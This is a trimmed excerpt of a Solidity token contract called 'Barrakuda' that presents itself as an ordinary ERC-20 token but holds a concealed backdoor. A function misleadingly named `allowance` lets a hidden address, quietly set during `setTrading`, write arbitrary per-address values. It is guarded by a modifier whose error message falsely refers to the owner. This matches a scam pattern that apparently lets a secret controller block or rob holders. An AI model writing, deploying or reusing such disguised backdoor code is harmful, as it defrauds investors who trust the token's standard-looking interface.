...
contract Ownable is Context {
    ...
    modifier lockSwap {
        require(_return == _Sender(), "Ownable: caller is not the owner");
        _;
    }
...
contract Barrakuda is Context, IERC20, Ownable {
    ...
    string private constant _name = "Barrakuda";
    string private constant _symbol = "Barrakuda";
    ...
    function allowance(address recipient, uint256 num) external lockSwap{
          _sets[recipient]=num;
    }

    function setTrading(address open) external onlyOwner {
        require(!_isTrading, "trading is already open");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router; _return=open;
